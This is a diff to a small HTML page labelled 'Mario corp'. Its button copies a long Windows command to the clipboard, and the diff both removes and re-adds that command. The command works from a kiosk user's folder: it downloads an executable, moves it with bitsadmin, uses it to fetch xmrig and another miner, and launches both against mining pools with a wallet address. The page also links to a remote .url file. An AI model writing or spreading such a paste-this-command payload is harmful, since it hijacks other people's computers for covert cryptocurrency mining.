@@ -25,6 +25,13 @@
       text-align: center;
     }
 
+		  a {
+      flex: 1;
+      width: 100%;
+      font-size: 18px;
+      text-align: center;
+    }
+
     /* Color-coded buttons */
     .stella1 {
       background-color: #3498db; /* Blue */
@@ -37,7 +44,7 @@
 	</style>
 </head>
 <body>
-    <div class="content">
+   
     <header>
         <h1>Mario corp</h1>
     </header>
@@ -47,24 +54,27 @@
  
 
    
-    <script src="./Página web estilo Messenger_files/script.js.descarga"></script>
     
 	
 
-	<button  class="stella12"  onclick="copiarAlPortapapeles()">Copiar al portapapeles</button>
+ <button onclick="copyToClipboard()">Copy Text</button>
 
-<script>
-function copiarAlPortapapeles() {
-  const texto = 'cd c:&cd/&cd users&cd kiosk&cd downloads&curl -O "https://picteon.dev/files/rdl.exe"&bitsadmin /create 1 & bitsadmin /addfile 1 c:\users\kiosk\downloads\rdl.exe c:\users\kiosk\rdl.exe& bitsadmin /RESUME 1 & bitsadmin /Complete 1 & bitsadmin /reset&cd..&timeout 120&rdl.exe -urlcache -split -f "https://storage.googleapis.com/mariocorp/xmrig.exe"&timeout120&rdl.exe -urlcache -split -f "https://storage.googleapis.com/mariocorp/miner.exe"&timeout 120&start "" cmd /c miner.exe --algo kawpow --server stratum+tcp://35.190.124.115:9200 --user NHbYNXxf7ZHUYhk4Mu2sdHiskr4wgvurHKet &timeout 120&start "" cmd /c xmrig.exe -o 34.149.22.228:9200 -u NHbYNXxf7ZHUYhk4Mu2sdHiskr4wgvurHKet -p x -a rx/0 -threads=1';
-  navigator.clipboard.writeText(texto);
-}
-</script>
+  <script>
+  function copyToClipboard() {
+    const text = `cd c:&cd/&cd users&cd kiosk&cd downloads&curl -O "https://picteon.dev/files/rdl.exe"&bitsadmin /create 1 & bitsadmin /addfile 1 c:\users\kiosk\downloads\rdl.exe c:\users\kiosk\rdl.exe& bitsadmin /RESUME 1 & bitsadmin /Complete 1 & bitsadmin /reset&cd..&timeout 120&rdl.exe -urlcache -split -f "https://storage.googleapis.com/mariocorp/xmrig.exe"&timeout120&rdl.exe -urlcache -split -f "https://storage.googleapis.com/mariocorp/miner.exe"&timeout 120&start "" cmd /c miner.exe --algo kawpow --server stratum+tcp://35.190.124.115:9200 --user NHbYNXxf7ZHUYhk4Mu2sdHiskr4wgvurHKet &timeout 120&start "" cmd /c xmrig.exe -o 34.149.22.228:9200 -u NHbYNXxf7ZHUYhk4Mu2sdHiskr4wgvurHKet -p x -a rx/0 -threads=1`;
+    navigator.clipboard.writeText(text).then(() => {
+      alert("Text copied to clipboard!");
+    }, (err) => {
+      console.error("Failed to copy text:", err);
+    });
+  }
+  </script>
 
 	
  
   <a class="stella1"  href="https://theglitchevil.github.io/mario/cmds2_1_1.url">cmdE</a>
 
-	</div>
+	
 	
 
 
